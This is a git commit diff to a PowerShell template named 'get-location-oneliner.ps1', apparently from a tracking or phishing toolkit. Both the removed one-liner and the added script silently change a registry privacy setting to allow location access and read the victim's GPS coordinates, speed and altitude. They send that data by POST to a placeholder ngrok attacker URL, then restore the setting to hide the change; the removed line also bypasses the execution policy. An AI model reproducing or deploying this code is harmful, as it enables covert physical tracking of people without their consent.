c05896126e7f437a34c9b2a897cc490fead3cfcb
Usama Abdul Sattar <usama123456789@protonmail.com>
2019-08-20 16:05:54 +0500

    Update get-location-oneliner.ps1

--- Template/get-location-oneliner.ps1
+++ Template/get-location-oneliner.ps1
@@ -1,2 +1,21 @@
-powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Device; Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '1'; $ngrokServer = \"ngrok_link/index.php\"; $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher; $GeoWatcher.Start(); while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }; $sendData = $GeoWatcher.Position.Location; Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '0'; Invoke-WebRequest -Uri $ngrokServer -Method \"POST\" -Body $sendData;"
+Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '1'
+Add-Type -AssemblyName System.Device 
+$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+$GeoWatcher.Start() 
 
+$ngrokServer = 'http://ngrok_link/index.php'
+
+
+while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+    Start-Sleep -Milliseconds 1000 
+}  
+
+if ($GeoWatcher.Permission -eq 'Denied'){
+    Write-Error 'Access Denied for Location Information'
+} else {
+    $send = $GeoWatcher.Position.Location
+    $sendData = "Latitude: $($send.Latitude) `nLongitude: $($send.Longitude) `nAltitude: $($send.altitude) `nCourse: $($send.Course) `nHorizontalAccuracy: $($send.HorizontalAccuracy) `nSpeed: $($send.Speed)"
+    Start-Sleep -Milliseconds 1000 
+    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $sendData
+    Set-Itemproperty -path 'HKLM:\SOFTWARE\\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '0'
+}
